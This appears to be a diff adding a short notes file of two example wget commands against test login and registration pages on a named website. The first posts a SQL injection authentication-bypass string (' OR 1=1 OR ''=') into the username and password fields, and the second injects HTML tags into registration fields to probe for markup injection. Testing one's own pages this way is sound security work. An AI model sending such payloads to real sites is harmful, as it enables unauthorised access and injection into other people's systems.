@@ -1,0 +1,18 @@
+THESE ARE THE EXAMPLES
+
+
+
+TEST #1 Login
+URL: http://recck.com/topics/test/login.php
+CMD: 
+wget --post-data="un=' OR 1=1 OR ''='&pw=' OR 1=1 OR ''='&submit=1" \
+http://recck.com/topics/test/login.php
+
+=====================================================
+=====================================================
+
+TEST #2 Register
+URL: http://recck.com/topics/test/register.php
+
+wget --post-data="un=<u>InjectionTest</u>&pw=password123&cpw=password123&email=<u>Stupid</u>&submit=1" \
+http://recck.com/topics/test/register.php
